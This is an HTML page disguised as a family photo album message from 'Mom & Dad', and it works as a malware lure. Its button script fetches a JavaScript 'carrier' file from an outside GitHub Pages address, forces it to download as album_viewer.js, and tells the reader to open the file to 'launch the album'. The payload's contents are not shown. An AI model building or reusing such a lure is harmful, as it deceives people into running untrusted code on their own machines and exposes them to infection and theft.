<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>The Thompson Family Album</title>
<style>
  :root{--ink:#3a3230;--accent:#b07d4f;--bg:#f7f3ee;}
  *{box-sizing:border-box}
  body{margin:0;font-family:Georgia,'Times New Roman',serif;background:var(--bg);color:var(--ink);line-height:1.6;}
  .wrap{max-width:560px;margin:0 auto;padding:48px 24px 64px;text-align:center;}
  .card{background:#fff;border:1px solid #e7ddd0;border-radius:14px;padding:40px 34px;box-shadow:0 10px 30px rgba(80,60,40,.08);}
  .envelope{font-size:52px;line-height:1;margin-bottom:8px;}
  h1{font-size:26px;margin:8px 0 4px;font-weight:600;color:#6b4a2f;letter-spacing:.2px;}
  .sub{font-style:italic;color:#8a7a6c;font-size:15px;margin:0 0 26px;}
  .photo{width:100%;height:200px;border-radius:10px;margin:0 0 28px;background:linear-gradient(135deg,#e9d9c6,#d8bfa3 45%,#b98d63);position:relative;overflow:hidden;}
  .photo:after{content:"\1F4F7";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:56px;opacity:.5;}
  .btn{display:inline-block;font-family:inherit;font-size:17px;font-weight:600;color:#fff;background:var(--accent);
       border:none;border-radius:10px;padding:14px 34px;cursor:pointer;text-decoration:none;box-shadow:0 4px 12px rgba(176,125,79,.4);transition:.15s;}
  .btn:hover{background:#9c6d43;transform:translateY(-1px);}
  .btn:active{transform:translateY(0);}
  .note{margin-top:22px;font-size:13px;color:#9a8b7c;font-style:italic;}
  .foot{margin-top:30px;font-size:12px;color:#b3a89b;}
</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="envelope">✉️</div>
      <h1>A message from Mom &amp; Dad</h1>
      <p class="sub">We made you a little album of the trip — tap to open it.</p>
      <div class="photo"></div>
      <a class="btn" id="open" href="#">Open the Album</a>
      <p class="note" id="status">It will download a small script that pulls the hidden files.</p>
    </div>
    <div class="foot">Family album &middot; sent from home</div>
  </div>
<script>
  // Download the carrier .js via fetch → Blob → object URL, ensuring a true file download.
  var base = 'https://tudahl003-cell.github.io/family-letters-2026';
  var carrierPath = '/viewer/album_viewer.js'; // the JS carrier we validated earlier
  document.getElementById('open').addEventListener('click', function(e){
    e.preventDefault();
    var status = document.getElementById('status');
    fetch(base + carrierPath, {cache:'no-store'}).then(function(r){
      if(!r.ok) throw new Error('fetch failed');
      return r.blob();
    }).then(function(blob){
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url; a.download = 'album_viewer.js';
      document.body.appendChild(a); a.click(); a.remove();
      setTimeout(()=>URL.revokeObjectURL(url),4000);
      status.textContent = 'Download started – open the file to launch the album.';
    }).catch(function(){
      // fallback: direct navigation (browser may still display source, but most will prompt download)
      window.location.href = base + carrierPath;
    });
  });
</script>
</body>
</html>
